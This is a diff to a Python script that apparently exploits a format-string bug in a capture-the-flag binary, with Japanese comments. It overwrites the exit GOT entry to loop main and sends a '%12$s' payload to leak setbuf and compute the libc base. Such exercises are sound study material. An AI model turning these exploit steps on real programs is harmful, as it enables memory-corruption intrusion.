@@ -54,9 +54,10 @@ uv run fsb.py
     """
     elf = ELF("./chall_vulnfunc")
     proc = Process("./chall_vulnfunc")
+    libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6") # ldd chall_vulnfunc
 
     addr_main = elf.symbol("main")
-    addr_exit = 0x404020
+    addr_exit = elf.got("exit")
 
     chunks = split_byte(addr_main, 1)
 
@@ -81,8 +82,19 @@ uv run fsb.py
     payload += p64(addr_exit + 2)
 
     show_text(payload)
+    proc.sendafter("Input message", payload) # mainを何度も呼び出せるようにするやつ
 
-    proc.sendlineafter("Input message", payload)
+    payload = b'%12$s----' # setbuf
+    proc.sendafter("Input message", payload)
+    output = proc.recvuntil(b"----")  # マーカーまで受け取る
+    leaked = output.rstrip(b"----")
+    leaked = leaked.lstrip(b"\n")
+    leaked_setbuf = int.from_bytes(leaked, byteorder='little') # 実際にリークされたアドレス
+    # readelf -s  /lib/x86_64-linux-gnu/libc.so.6 | grep ' setbuf@@GLIBC'
+    offset_setbuf = libc_elf.symbol("setbuf")         # 上で調べたオフセット
+    libc_base = leaked_setbuf - offset_setbuf
+    print("libc_base", hex(libc_base))
+    print("leak raw:", leaked, hex(leaked_setbuf))
     proc.interactive()
     return
 
